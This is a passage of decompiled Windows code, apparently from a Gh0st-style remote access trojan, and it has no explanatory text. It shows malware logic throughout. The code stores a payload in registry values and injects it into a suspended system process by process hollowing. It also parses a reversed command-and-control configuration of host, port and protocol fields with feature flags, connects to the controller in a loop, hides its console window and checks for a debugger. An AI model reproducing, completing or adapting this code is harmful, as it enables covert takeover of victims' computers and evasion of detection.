  }
  RegOpenKeyExW((HKEY)0x80000002,L"SOFTWARE",0,0x102,&local_20);
  RegDeleteValueW(local_20,L"IpDates_info");
  RegSetValueExW(local_20,L"IpDates_info",0,3,&DAT_0041c7d8,0x12a0);
  RegCloseKey(local_20);
  if (*(int *)(param_1 + 0x14) != 0) {
    aDStack_1c[1] = 0;
    aDStack_1c[2] = 0;
    aDStack_1c[3] = 0;
    aDStack_1c[4] = 0;
    do {
      do {
        iVar3 = FUN_00405830();
      } while (iVar3 == 0);
      while (((hProcess = OpenProcess(0x400,0,aDStack_1c[3]), hProcess != (HANDLE)0x0 &&
              (BVar2 = GetExitCodeProcess(hProcess,aDStack_1c), BVar2 != 0)) &&
             (aDStack_1c[0] == 0x103))) {
        Sleep(3000);
      }
    } while( true );
  }
  (*DAT_0041c7d4)();
  return 0;
}



/* Function: FUN_00405460 */

undefined4 * __thiscall FUN_00405460(void *this,byte param_1)

{
  *(undefined ***)this = CKernelManager::vftable;
  CloseHandle(*(HANDLE *)((int)this + 0x18));
  *(undefined ***)this = CManager::vftable;
  CloseHandle(*(HANDLE *)((int)this + 0xc));
  if ((param_1 & 1) != 0) {
    FUN_004069ca(this);
  }
  return (undefined4 *)this;
}



/* Function: FUN_004054a0 */

void __fastcall FUN_004054a0(undefined4 *param_1)

{
  *param_1 = CKernelManager::vftable;
  CloseHandle((HANDLE)param_1[6]);
  *param_1 = CManager::vftable;
  CloseHandle((HANDLE)param_1[3]);
  return;
}



/* Function: FUN_004054d0 */

void __thiscall FUN_004054d0(void *this,HKEY param_1,uint param_2)

{
  ushort uVar1;
  LSTATUS LVar2;
  LPDWORD lpcbData;
  ushort *puVar3;
  undefined1 *puVar4;
  BYTE *lpData;
  uintptr_t uVar5;
  int iVar6;
  ushort *puVar7;
  HKEY pHVar8;
  LPDWORD pDVar9;
  undefined4 *puVar10;
  DWORD *pDVar11;
  undefined4 *puVar12;
  BYTE *pBVar13;
  bool bVar14;
  HKEY hKey;
  undefined4 local_a54;
  undefined4 local_a50;
  undefined4 local_a4c;
  undefined4 local_a48;
  undefined4 local_a44;
  undefined4 local_a40;
  undefined4 local_a3c;
  undefined2 local_a38;
  undefined1 local_a36 [484];
  undefined2 local_852;
  undefined4 local_850;
  undefined4 local_84c;
  undefined1 local_848 [100];
  undefined1 local_7e4 [2000];
  undefined4 local_14;
  DWORD local_10;
  HKEY local_c;
  void *local_8;
  
  pHVar8 = param_1;
  if ((char)param_1->unused != -0x37) {
    local_8 = this;
    if (param_2 == 0x65) {
      local_10 = 3;
      param_2 = 0;
      LVar2 = RegOpenKeyExW((HKEY)0x80000001,L"Console\\0",0,0x20019,&local_c);
      if (LVar2 == 0) {
        hKey = local_c;
        RegQueryValueExW(local_c,L"d33f351a4aeea5e608853d1a56661059",(LPDWORD)0x0,&local_10,
                         (LPBYTE)0x0,&param_2);
        if (0xa44 < param_2) {
          lpcbData = (LPDWORD)FUN_004069bf(param_2);
          _memset(lpcbData,0,param_2);
          LVar2 = RegQueryValueExW(hKey,(LPCWSTR)local_c,
                                   (LPDWORD)L"d33f351a4aeea5e608853d1a56661059",(LPDWORD)0x0,
                                   (LPBYTE)&local_10,lpcbData);
          pHVar8 = param_1;
          if (LVar2 == 0) {
            pDVar9 = lpcbData;
            pDVar11 = &DAT_0041bd90;
            for (iVar6 = 0x291; iVar6 != 0; iVar6 = iVar6 + -1) {
              *pDVar11 = *pDVar9;
              pDVar9 = pDVar9 + 1;
              pDVar11 = pDVar11 + 1;
            }
            DAT_0041c7d4 = VirtualAlloc((LPVOID)0x0,DAT_0041bf98,0x3000,0x40);
            FID_conflict__memcpy(DAT_0041c7d4,lpcbData + 0x291,DAT_0041bf98);
            pHVar8 = param_1;
          }
        }
        RegCloseKey(local_c);
        this = local_8;
      }
      puVar7 = &DAT_0041bf9c;
      puVar3 = (ushort *)((int)&pHVar8->unused + 1);
      do {
        uVar1 = *puVar3;
        bVar14 = uVar1 < *puVar7;
        if (uVar1 != *puVar7) {
LAB_004055f8:
          iVar6 = (1 - (uint)bVar14) - (uint)(bVar14 != 0);
          goto LAB_004055fd;
        }
        if (uVar1 == 0) break;
        uVar1 = puVar3[1];
        bVar14 = uVar1 < puVar7[1];
        if (uVar1 != puVar7[1]) goto LAB_004055f8;
        puVar3 = puVar3 + 2;
        puVar7 = puVar7 + 2;
      } while (uVar1 != 0);
      iVar6 = 0;
LAB_004055fd:
      if (iVar6 != 0) {
        if (DAT_0041c7d4 != (LPVOID)0x0) {
          VirtualFree(DAT_0041c7d4,0,0x8000);
          DAT_0041c7d4 = (LPVOID)0x0;
        }
        local_a54 = 0;
        local_a50 = 0x5f55767b;
        local_a4c = 0x57576a21;
        local_a48 = 0x64002e;
        local_a44 = 0x6c006c;
        local_a40 = 0x62005f;
        local_a3c = 0x6e0069;
        local_a38 = 0;
        _memset(local_a36,0,0x1e4);
        local_852 = 0;
        local_850 = 0;
        local_84c = 0;
        _memset(local_848,0,100);
        _memset(local_7e4,0,2000);
        local_14 = 0;
        puVar4 = (undefined1 *)FUN_004069bf(0xa45);
        *puVar4 = 5;
        FID_conflict__memcpy(puVar4 + 1,&local_a54,0xa44);
        if (*(int *)((int)local_8 + 8) == 0) {
          (**(code **)(**(int **)((int)local_8 + 4) + 8))(puVar4,0xa45);
        }
        FUN_004069ca(puVar4);
        return;
      }
    }
    else {
      puVar10 = (undefined4 *)((int)&param_1->unused + 1);
      puVar12 = &DAT_0041bd90;
      for (iVar6 = 0x291; iVar6 != 0; iVar6 = iVar6 + -1) {
        *puVar12 = *puVar10;
        puVar10 = puVar10 + 1;
        puVar12 = puVar12 + 1;
      }
      DAT_0041c7d4 = VirtualAlloc((LPVOID)0x0,DAT_0041bf98,0x3000,0x40);
      FID_conflict__memcpy(DAT_0041c7d4,(void *)((int)&pHVar8[0x291].unused + 1),DAT_0041bf98);
      param_2 = DAT_0041bf98 + 0xa44;
      lpData = (BYTE *)FUN_004069bf(param_2);
      this = local_8;
      if (lpData != (BYTE *)0x0) {
        puVar10 = &DAT_0041bd90;
        pBVar13 = lpData;
        for (iVar6 = 0x291; iVar6 != 0; iVar6 = iVar6 + -1) {
          *(undefined4 *)pBVar13 = *puVar10;
          puVar10 = puVar10 + 1;
          pBVar13 = pBVar13 + 4;
        }
        FID_conflict__memcpy(lpData + 0xa44,DAT_0041c7d4,DAT_0041bf98);
        LVar2 = RegCreateKeyW((HKEY)0x80000001,L"Console\\0",&param_1);
        if (LVar2 == 0) {
          RegDeleteValueW(param_1,L"d33f351a4aeea5e608853d1a56661059");
          RegSetValueExW(param_1,L"d33f351a4aeea5e608853d1a56661059",0,3,lpData,param_2);
        }
        RegCloseKey(param_1);
        FUN_0040747b(lpData);
        this = local_8;
      }
    }
    uVar5 = __beginthreadex((void *)0x0,0,FUN_004052c0,this,0,(uint *)0x0);
    *(uintptr_t *)((int)this + 0x18) = uVar5;
    Sleep(3000);
    (**(code **)**(undefined4 **)((int)this + 4))();
  }
  return;
}



/* Function: FUN_00405830 */

void FUN_00405830(void)

{
  DWORD DVar1;
  BOOL BVar2;
  LPVOID lpBaseAddress;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  LPPROCESS_INFORMATION unaff_ESI;
  SIZE_T unaff_EDI;
  _STARTUPINFOA local_41c;
  LPCVOID local_3d8;
  CONTEXT local_3d4;
  CHAR local_108;
  undefined1 local_107 [2];
  undefined1 local_105;
  uint local_8;
  
  local_8 = DAT_004191b4 ^ (uint)&stack0xfffffffc;
  local_3d8 = DAT_0041c7d4;
  _memset(&local_41c,0,0x44);
  unaff_ESI->hProcess = (HANDLE)0x0;
  unaff_ESI->hThread = (HANDLE)0x0;
  unaff_ESI->dwProcessId = 0;
  unaff_ESI->dwThreadId = 0;
  _memset(&local_3d4,0,0x2cc);
  local_41c.cb = 0x44;
  local_41c.dwFlags = 1;
  local_41c.wShowWindow = 0;
  local_108 = '\0';
  _memset(local_107,0,0xfe);
  GetSystemDirectoryA(&local_108,0xff);
  local_105 = 0;
  FUN_004059f0(extraout_ECX,&local_108,"%s%s");
  DVar1 = GetFileAttributesA(&local_108);
  if (DVar1 == 0xffffffff) {
    local_105 = 0;
    FUN_004059f0(extraout_ECX_00,&local_108,"%s%s");
  }
  BVar2 = CreateProcessA(&local_108,(LPSTR)0x0,(LPSECURITY_ATTRIBUTES)0x0,(LPSECURITY_ATTRIBUTES)0x0
                         ,0,4,(LPVOID)0x0,(LPCSTR)0x0,&local_41c,unaff_ESI);
  if (BVar2 == 0) {
    __security_check_cookie(local_8 ^ (uint)&stack0xfffffffc);
    return;
  }
  lpBaseAddress = VirtualAllocEx(unaff_ESI->hProcess,(LPVOID)0x0,unaff_EDI,0x3000,0x40);
  if (lpBaseAddress != (LPVOID)0x0) {
    BVar2 = WriteProcessMemory(unaff_ESI->hProcess,lpBaseAddress,local_3d8,unaff_EDI,(SIZE_T *)0x0);
    if (BVar2 != 0) {
      local_3d4.ContextFlags = 0x10007;
      BVar2 = GetThreadContext(unaff_ESI->hThread,&local_3d4);
      if (BVar2 != 0) {
        local_3d4.Eip = (DWORD)lpBaseAddress;
        BVar2 = SetThreadContext(unaff_ESI->hThread,&local_3d4);
        if (BVar2 != 0) {
          ResumeThread(unaff_ESI->hThread);
          __security_check_cookie(local_8 ^ (uint)&stack0xfffffffc);
          return;
        }
      }
    }
  }
  __security_check_cookie(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



/* Function: FUN_004059f0 */

void __fastcall FUN_004059f0(undefined4 param_1,char *param_2,char *param_3)

{
  _vsprintf_s(param_2,0xff,param_3,&stack0x00000008);
  return;
}



/* Function: FUN_00405a10 */

void FUN_00405a10(void)

{
  undefined4 *in_EAX;
  BOOL BVar1;
  
  if ((HANDLE)*in_EAX != (HANDLE)0x0) {
    BVar1 = CloseHandle((HANDLE)*in_EAX);
    if (BVar1 == 0) {
      FUN_00401280();
      return;
    }
  }
  return;
}



/* Function: FUN_00405a30 */

undefined4 * FUN_00405a30(undefined4 *param_1)

{
  uint uVar1;
  HANDLE pvVar2;
  int iVar3;
  BOOL BVar4;
  DWORD DVar5;
  undefined4 uVar6;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_00414156;
  local_10 = ExceptionList;
  uVar1 = DAT_004191b4 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  param_1[2] = 0;
  param_1[3] = 0;
  param_1[4] = 0;
  *param_1 = CUdpSocket::vftable;
  pvVar2 = CreateEventW((LPSECURITY_ATTRIBUTES)0x0,1,1,(LPCWSTR)0x0);
  param_1[0xb] = pvVar2;
  if (pvVar2 == (HANDLE)0x0) {
    FUN_00401280();
  }
  local_8 = 0;
  param_1[0xc] = 1;
  param_1[0xd] = 5;
  param_1[0xe] = 0;
  param_1[0xf] = 1;
  param_1[0x13] = 0x3c;
  param_1[0x14] = 0x3c;
  param_1[0x10] = 0xffffffff;
  param_1[0x11] = 0;
  param_1[0x12] = 0;
  param_1[0x15] = 0;
  param_1[0x16] = 0;
  param_1[0x17] = 0;
  param_1[0x18] = 0;
  param_1[0x19] = 3;
  param_1[0x1a] = 0;
  param_1[0x1b] = 0;
  param_1[0x1c] = 0;
  iVar3 = (**(code **)(PTR_PTR_00419000 + 0xc))(uVar1);
  param_1[0x1d] = iVar3 + 0x10;
  local_8._0_1_ = 1;
  *(undefined2 *)(param_1 + 0x1e) = 0;
  FUN_004065d0();
  local_8 = CONCAT31(local_8._1_3_,2);
  param_1[0x57] = 0;
  BVar4 = InitializeCriticalSectionAndSpinCount((LPCRITICAL_SECTION)(param_1 + 0x58),0);
  if (BVar4 == 0) {
    FUN_00401280();
  }
  param_1[0x5f] = 0;
  param_1[0x60] = 0;
  param_1[0x5e] = 0;
  param_1[0x61] = param_1 + 0x1f;
  local_8 = CONCAT31(local_8._1_3_,4);
  pvVar2 = CreateEventW((LPSECURITY_ATTRIBUTES)0x0,0,0,(LPCWSTR)0x0);
  param_1[0x62] = pvVar2;
  if (pvVar2 == (HANDLE)0x0) {
    FUN_00401280();
  }
  local_8 = CONCAT31(local_8._1_3_,5);
  pvVar2 = CreateEventW((LPSECURITY_ATTRIBUTES)0x0,0,0,(LPCWSTR)0x0);
  param_1[99] = pvVar2;
  if (pvVar2 == (HANDLE)0x0) {
    FUN_00401280();
  }
  local_8 = CONCAT31(local_8._1_3_,6);
  pvVar2 = CreateEventW((LPSECURITY_ATTRIBUTES)0x0,0,0,(LPCWSTR)0x0);
  param_1[100] = pvVar2;
  if (pvVar2 == (HANDLE)0x0) {
    FUN_00401280();
  }
  local_8 = CONCAT31(local_8._1_3_,7);
  param_1[0x65] = 0;
  param_1[0x66] = 0;
  param_1[0x69] = 2;
  param_1[0x6a] = 10;
  param_1[0x6b] = 0x80;
  param_1[0x6c] = 0x200;
  param_1[0x6d] = 0x1e;
  param_1[0x6e] = 0x598;
  param_1[0x6f] = 5;
  param_1[0x70] = 0x1000;
  param_1[0x71] = 5000;
  param_1[0x67] = 1;
  param_1[0x68] = 1;
  param_1[0x72] = 0;
  param_1[0x73] = 0;
  param_1[0x76] = CArqSessionT<class_CUdpSocket,class_CUdpSocket>::vftable;
  param_1[0x77] = 0;
  param_1[0x78] = 0;
  param_1[0x79] = 0;
  param_1[0x7a] = 0;
  param_1[0x7b] = 0;
  param_1[0x7c] = 0;
  param_1[0x7d] = 0;
  param_1[0x7e] = 0;
  param_1[0x7f] = 0;
  BVar4 = InitializeCriticalSectionAndSpinCount((LPCRITICAL_SECTION)(param_1 + 0x80),0);
  if (BVar4 == 0) {
    FUN_00401280();
  }
  local_8 = CONCAT31(local_8._1_3_,8);
  BVar4 = InitializeCriticalSectionAndSpinCount((LPCRITICAL_SECTION)(param_1 + 0x86),0);
  if (BVar4 == 0) {
    FUN_00401280();
  }
  param_1[0x8c] = 0;
  param_1[0x8d] = CBuffer::vftable;
  param_1[0x90] = 0;
  param_1[0x8e] = 0;
  param_1[0x8f] = 0;
  param_1[0x91] = CBuffer::vftable;
  param_1[0x94] = 0;
  param_1[0x92] = 0;
  param_1[0x93] = 0;
  param_1[0x95] = CBuffer::vftable;
  param_1[0x98] = 0;
  param_1[0x96] = 0;
  param_1[0x97] = 0;
  local_8 = CONCAT31(local_8._1_3_,0xc);
  InterlockedExchange(param_1 + 6,0);
  DVar5 = timeGetTime();
  param_1[5] = DVar5;
  pvVar2 = CreateEventW((LPSECURITY_ATTRIBUTES)0x0,1,0,(LPCWSTR)0x0);
  param_1[1] = pvVar2;
  pvVar2 = CreateEventW((LPSECURITY_ATTRIBUTES)0x0,0,0,(LPCWSTR)0x0);
  param_1[0x99] = pvVar2;
  param_1[5] = 0;
  uVar6 = FUN_004069bf(param_1[0x70]);
  param_1[0x72] = uVar6;
  uVar6 = FUN_004069bf(0x598);
  param_1[0x1c] = uVar6;
  ExceptionList = local_10;
  return param_1;
}



/* Function: FUN_00405d70 */

void __cdecl FUN_00405d70(LPCWSTR param_1,LPCWSTR param_2,undefined4 *param_3)

{
  int iVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  WCHAR *pWVar5;
  
  if (param_2 != (LPCWSTR)0x0) {
    iVar1 = lstrlenW(param_2);
    _memset(param_2,0,iVar1 * 2 + 2);
  }
  iVar2 = lstrlenW(&DAT_0041a310);
  iVar3 = lstrlenW(param_1);
  iVar1 = 0;
  if (iVar2 < 1) {
    return;
  }
  do {
    iVar4 = 0;
    if (0 < iVar3) {
      pWVar5 = &DAT_0041a310 + iVar1;
      do {
        if (*pWVar5 != param_1[iVar4]) break;
        iVar4 = iVar4 + 1;
        pWVar5 = pWVar5 + 1;
      } while (iVar4 < iVar3);
    }
    if (iVar4 == iVar3) {
      iVar4 = iVar1 + iVar3;
      for (iVar1 = iVar4; iVar1 < iVar2; iVar1 = iVar1 + 1) {
        if ((&DAT_0041a310)[iVar1] == 0x7c) {
          if (param_2 != (LPCWSTR)0x0) {
            FID_conflict__memcpy(param_2,&DAT_0041a310 + iVar4,(iVar1 - iVar4) * 2);
            return;
          }
          if (*(short *)(&DAT_0041a30e + iVar1 * 2) != 0x31) {
            return;
          }
          *param_3 = 1;
          return;
        }
      }
    }
    iVar1 = iVar1 + 1;
    if (iVar2 <= iVar1) {
      return;
    }
  } while( true );
}



/* Function: FUN_00405e40 */

void FUN_00405e40(void)

{
  LSTATUS LVar1;
  HKEY local_10;
  DWORD local_c;
  DWORD local_8;
  
  if (DAT_0041da8c == '\0') {
    DAT_0041da8c = '\x01';
    __wcsrev(&DAT_0041a310);
    _memset(&DAT_0041c7d8,0,0x12a0);
    FUN_00405d70(L"p1:",(LPCWSTR)&DAT_0041c7f6,(undefined4 *)0x0);
    FUN_00405d70(L"o1:",(LPCWSTR)&DAT_0041c9f4,(undefined4 *)0x0);
    FUN_00405d70(L"t1:",(LPCWSTR)0x0,&DAT_0041ca30);
    FUN_00405d70(L"p2:",(LPCWSTR)&DAT_0041ca34,(undefined4 *)0x0);
    FUN_00405d70(L"o2:",(LPCWSTR)&DAT_0041cc32,(undefined4 *)0x0);
    FUN_00405d70(L"t2:",(LPCWSTR)0x0,&DAT_0041cc70);
    FUN_00405d70(L"p3:",(LPCWSTR)&DAT_0041cc74,(undefined4 *)0x0);
    FUN_00405d70(L"o3:",(LPCWSTR)&DAT_0041ce72,(undefined4 *)0x0);
    FUN_00405d70(L"t3:",(LPCWSTR)0x0,&DAT_0041ceb0);
    FUN_00405d70(L"dd:",(LPCWSTR)&DAT_0041ceb4,(undefined4 *)0x0);
    FUN_00405d70(L"cl:",(LPCWSTR)&DAT_0041cef0,(undefined4 *)0x0);
    FUN_00405d70(L"fz:",(LPCWSTR)&DAT_0041cf2c,(undefined4 *)0x0);
    FUN_00405d70(L"bb:",(LPCWSTR)&DAT_0041cf90,(undefined4 *)0x0);
    FUN_00405d70(L"bz:",(LPCWSTR)&DAT_0041cff4,(undefined4 *)0x0);
    FUN_00405d70(L"jp:",(LPCWSTR)0x0,(undefined4 *)&DAT_0041d058);
    FUN_00405d70(L"sx:",(LPCWSTR)0x0,(undefined4 *)&DAT_0041d05c);
    FUN_00405d70(L"bh:",(LPCWSTR)0x0,(undefined4 *)&DAT_0041d060);
    FUN_00405d70(L"ll:",(LPCWSTR)0x0,(undefined4 *)&DAT_0041d064);
    FUN_00405d70(L"dl:",(LPCWSTR)0x0,(undefined4 *)&DAT_0041d068);
    FUN_00405d70(L"sh:",(LPCWSTR)0x0,(undefined4 *)&DAT_0041d06c);
    FUN_00405d70(L"kl:",(LPCWSTR)0x0,&DAT_0041d070);
    FUN_00405d70(L"bd:",(LPCWSTR)0x0,(undefined4 *)&DAT_0041d074);
    local_c = 3;
    local_8 = 0;
    LVar1 = RegOpenKeyExW((HKEY)0x80000001,L"Console",0,0x20019,&local_10);
    if (LVar1 == 0) {
      RegQueryValueExW(local_10,L"IpDate",(LPDWORD)0x0,&local_c,(LPBYTE)0x0,&local_8);
    }
    if (10 < local_8) {
      _memset(&DAT_0041a310,0,2000);
      RegQueryValueExW(local_10,L"IpDate",(LPDWORD)0x0,&local_c,(LPBYTE)&DAT_0041a310,&local_8);
      FUN_00405d70(L"p1:",(LPCWSTR)&DAT_0041c7f6,(undefined4 *)0x0);
      FUN_00405d70(L"o1:",(LPCWSTR)&DAT_0041c9f4,(undefined4 *)0x0);
      FUN_00405d70(L"t1:",(LPCWSTR)0x0,&DAT_0041ca30);
      FUN_00405d70(L"p2:",(LPCWSTR)&DAT_0041ca34,(undefined4 *)0x0);
      FUN_00405d70(L"o2:",(LPCWSTR)&DAT_0041cc32,(undefined4 *)0x0);
      FUN_00405d70(L"t2:",(LPCWSTR)0x0,&DAT_0041cc70);
      FUN_00405d70(L"p3:",(LPCWSTR)&DAT_0041cc74,(undefined4 *)0x0);
      FUN_00405d70(L"o3:",(LPCWSTR)&DAT_0041ce72,(undefined4 *)0x0);
      FUN_00405d70(L"t3:",(LPCWSTR)0x0,&DAT_0041ceb0);
    }
  }
  return;
}



/* Function: FUN_00406120 */

void FUN_00406120(void)

{
  char cVar1;
  int iVar2;
  void *pvVar3;
  undefined4 uVar4;
  int *piVar5;
  undefined **local_38;
  int *local_34;
  undefined4 local_30;
  HANDLE local_2c;
  undefined4 local_24;
  HANDLE local_20;
  int *local_1c;
  int *local_18;
  undefined2 local_14 [2];
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_004141d3;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  iVar2 = FUN_00407734((wchar_t *)&DAT_0041ceb4);
  Sleep(iVar2 * 1000);
  piVar5 = (int *)0x0;
  pvVar3 = operator_new(0x68);
  if (pvVar3 == (void *)0x0) {
    local_18 = (int *)0x0;
  }
  else {
    local_18 = (int *)FUN_00402c60();
  }
  local_1c = (int *)operator_new(0x270);
  local_8 = 0;
  if (local_1c == (undefined4 *)0x0) {
    local_1c = (int *)0x0;
  }
  else {
    local_1c = FUN_00405a30(local_1c);
  }
  local_8 = 0xffffffff;
  do {
    FUN_00402c50();
    if (DAT_0041bd86 == '\0') {
      _wcscpy_s((wchar_t *)&DAT_0041b988,0xff,(wchar_t *)&DAT_0041c7f6);
      _wcscpy_s((wchar_t *)&DAT_0041b94c,0x1e,(wchar_t *)&DAT_0041c9f4);
      DAT_0041b948 = DAT_0041ca30;
    }
    else {
      _wcscpy_s((wchar_t *)&DAT_0041b988,0xff,(wchar_t *)&DAT_0041ca34);
      _wcscpy_s((wchar_t *)&DAT_0041b94c,0x1e,(wchar_t *)&DAT_0041cc32);
      DAT_0041b948 = DAT_0041cc70;
    }
    DAT_0041bd86 = DAT_0041bd86 == '\0';
    DAT_0041da7c = DAT_0041da7c + 1;
    if (DAT_0041da7c == 200) {
      FUN_00402c50();
      _wcscpy_s((wchar_t *)&DAT_0041b988,0xff,(wchar_t *)&DAT_0041cc74);
      _wcscpy_s((wchar_t *)&DAT_0041b94c,0x1e,(wchar_t *)&DAT_0041ce72);
      DAT_0041b948 = DAT_0041ceb0;
      DAT_0041da7c = 0;
    }
    if (piVar5 != (int *)0x0) {
      (**(code **)*piVar5)();
    }
    piVar5 = local_18;
    if (DAT_0041b948 != 1) {
      piVar5 = local_1c;
    }
    iVar2 = FUN_00407734((wchar_t *)&DAT_0041cef0);
    Sleep(iVar2 * 1000);
    iVar2 = *piVar5;
    uVar4 = FUN_00407734((wchar_t *)&DAT_0041b94c);
    cVar1 = (**(code **)(iVar2 + 0x10))(&DAT_0041b988,uVar4);
    uVar4 = DAT_0041d070;
    if (cVar1 != '\0') {
      local_38 = CManager::vftable;
      local_34 = piVar5;
      (**(code **)(*piVar5 + 0xc))(&local_38);
      local_2c = CreateEventA((LPSECURITY_ATTRIBUTES)0x0,1,0,(LPCSTR)0x0);
      local_30 = 0;
      local_38 = CKernelManager::vftable;
      local_20 = (HANDLE)0x0;
      local_24 = uVar4;
      local_8 = 1;
      local_14[0] = 4;
      (**(code **)(*piVar5 + 8))(local_14,2);
      (**(code **)(*piVar5 + 0x14))();
      WaitForSingleObject(local_20,0xffffffff);
      local_8 = 0xffffffff;
      local_38 = CKernelManager::vftable;
      CloseHandle(local_20);
      local_38 = CManager::vftable;
      CloseHandle(local_2c);
    }
  } while( true );
}



/* Function: FUN_00406390 */

void __fastcall FUN_00406390(int param_1)

{
  HMODULE hModule;
  HANDLE hObject;
  DWORD DVar1;
  HANDLE pvVar2;
  uint uVar3;
  HANDLE pvVar4;
  undefined4 uVar5;
  undefined4 uVar6;
  undefined4 uVar7;
  DWORD local_230;
  int local_22c;
  undefined4 local_228;
  FARPROC local_224;
  _SYSTEMTIME local_220;
  WCHAR local_210;
  undefined1 local_20e [518];
  uint local_8;
  
  local_8 = DAT_004191b4 ^ (uint)&stack0xfffffffc;
  hModule = LoadLibraryW(L"DbgHelp.dll");
  if (hModule != (HMODULE)0x0) {
    local_224 = GetProcAddress(hModule,"MiniDumpWriteDump");
    if (local_224 != (FARPROC)0x0) {
      local_210 = L'\0';
      _memset(local_20e,0,0x206);
      GetLocalTime(&local_220);
      wsprintfW(&local_210,L"%s-%04d%02d%02d-%02d%02d%02d.dmp",L"!analyze -v",(uint)local_220.wYear,
                (uint)local_220.wMonth,(uint)local_220.wDay,(uint)local_220.wHour,
                (uint)local_220.wMinute,(uint)local_220.wSecond);
      hObject = CreateFileW(&local_210,0xc0000000,3,(LPSECURITY_ATTRIBUTES)0x0,2,0,(HANDLE)0x0);
      if (hObject == (HANDLE)0xffffffff) {
        FreeLibrary(hModule);
        __security_check_cookie(local_8 ^ (uint)&stack0xfffffffc);
        return;
      }
      local_230 = GetCurrentThreadId();
      uVar7 = 0;
      uVar6 = 0;
      uVar3 = -(uint)(param_1 != 0) & (uint)&local_230;
      uVar5 = 1;
      local_228 = 0;
      pvVar4 = hObject;
      local_22c = param_1;
      DVar1 = GetCurrentProcessId();
      pvVar2 = GetCurrentProcess();
      (*local_224)(pvVar2,DVar1,pvVar4,uVar5,uVar3,uVar6,uVar7);
      CloseHandle(hObject);
      FreeLibrary(hModule);
      __security_check_cookie(local_8 ^ (uint)&stack0xfffffffc);
      return;
    }
    FreeLibrary(hModule);
  }
  __security_check_cookie(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



/* Function: FUN_00406510 */

undefined4 FUN_00406510(int param_1)

{
  BOOL BVar1;
  undefined4 uVar2;
  
  BVar1 = IsDebuggerPresent();
  if (BVar1 != 0) {
    return 0;
  }
  uVar2 = FUN_00406390(param_1);
  return uVar2;
}



/* Function: FUN_00406530 */

undefined4 FUN_00406530(void)

{
  HWND hWnd;
  DWORD idThread;
  UINT Msg;
  WPARAM wParam;
  int nCmdShow;
  LPARAM lParam;
  
  SetUnhandledExceptionFilter(FUN_00406510);
  nCmdShow = 0;
  hWnd = GetConsoleWindow();
  ShowWindow(hWnd,nCmdShow);
  lParam = 0;
  wParam = 0;
  Msg = 0;
  idThread = GetCurrentThreadId();
  PostThreadMessageA(idThread,Msg,wParam,lParam);
  GetInputState();
  FUN_00405e40();
  DAT_0041da78 = CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,FUN_00406120,(LPVOID)0x0,0,(LPDWORD)0x0);
  WaitForSingleObject(DAT_0041da78,0xffffffff);
  CloseHandle(DAT_0041da78);
  Sleep(300);
  return 0;
}



/* Function: FUN_004065b0 */

void FUN_004065b0(void)

{
  int *piVar1;
  int iVar2;
  int *in_EAX;
  undefined4 *puVar3;
  
  puVar3 = (undefined4 *)(*in_EAX + -0x10);
  piVar1 = (int *)(*in_EAX + -4);
  LOCK();
  iVar2 = *piVar1;
  *piVar1 = *piVar1 + -1;
  UNLOCK();
  if (iVar2 == 1 || iVar2 + -1 < 0) {
    (**(code **)(*(int *)*puVar3 + 4))(puVar3);
  }
  return;
}



/* Function: FUN_004065d0 */

void FUN_004065d0(void)

{
  undefined4 uVar1;
  HANDLE pvVar2;
  undefined4 *unaff_ESI;
  
  uVar1 = DAT_0041ab38;
  unaff_ESI[1] = 4;
  unaff_ESI[2] = 0;
  unaff_ESI[3] = 0;
  pvVar2 = HeapCreate(4,0,0);
  *unaff_ESI = pvVar2;
  if (pvVar2 == (HANDLE)0x0) {
    FUN_00401280();
  }
  unaff_ESI[4] = uVar1;
  unaff_ESI[5] = 0x400;
  unaff_ESI[6] = 0x400;
  unaff_ESI[8] = 0;
  unaff_ESI[7] = 0;
  unaff_ESI[0x18] = 0;
  unaff_ESI[0x28] = 0;
  if ((void *)unaff_ESI[8] != (void *)0x0) {
    _free((void *)unaff_ESI[8]);
    unaff_ESI[8] = 0;
    unaff_ESI[7] = 0;
    unaff_ESI[0x18] = 0;
    unaff_ESI[0x28] = 0;
  }
  return;
}



/* Function: FUN_00406650 */

void FUN_00406650(void)

{
  undefined4 *in_EAX;
  HANDLE pvVar1;
  
  FUN_00401420();
  if ((HANDLE)*in_EAX != (HANDLE)0x0) {
    HeapDestroy((HANDLE)*in_EAX);
  }
  pvVar1 = HeapCreate(in_EAX[1],in_EAX[2],in_EAX[3]);
  *in_EAX = pvVar1;
  if ((void *)in_EAX[8] != (void *)0x0) {
    _free((void *)in_EAX[8]);
    in_EAX[8] = 0;
    in_EAX[7] = 0;
    in_EAX[0x18] = 0;
    in_EAX[0x28] = 0;
  }
  if ((HANDLE)*in_EAX != (HANDLE)0x0) {
    HeapDestroy((HANDLE)*in_EAX);
  }
  return;
}



/* Function: FUN_004066c0 */

void FUN_004066c0(void)

{
  return;
}



/* Function: FUN_004066d0 */

void __fastcall FUN_004066d0(undefined4 *param_1)

{
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_00414196;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  *param_1 = CArqSessionT<class_CUdpSocket,class_CUdpSocket>::vftable;
  local_8 = 1;
  FUN_00404b60();
  DeleteCriticalSection((LPCRITICAL_SECTION)(param_1 + 0x10));
  DeleteCriticalSection((LPCRITICAL_SECTION)(param_1 + 10));
  ExceptionList = local_10;
  return;
}



/* Function: FUN_00406740 */

undefined4 * __thiscall FUN_00406740(void *this,byte param_1)

{
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_00414196;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  *(undefined ***)this = CArqSessionT<class_CUdpSocket,class_CUdpSocket>::vftable;
  local_8 = 1;
  FUN_00404b60();
  DeleteCriticalSection((LPCRITICAL_SECTION)((int)this + 0x40));
  DeleteCriticalSection((LPCRITICAL_SECTION)((int)this + 0x28));
  if ((param_1 & 1) != 0) {
    FUN_004069ca(this);
  }
  ExceptionList = local_10;
  return (undefined4 *)this;
}



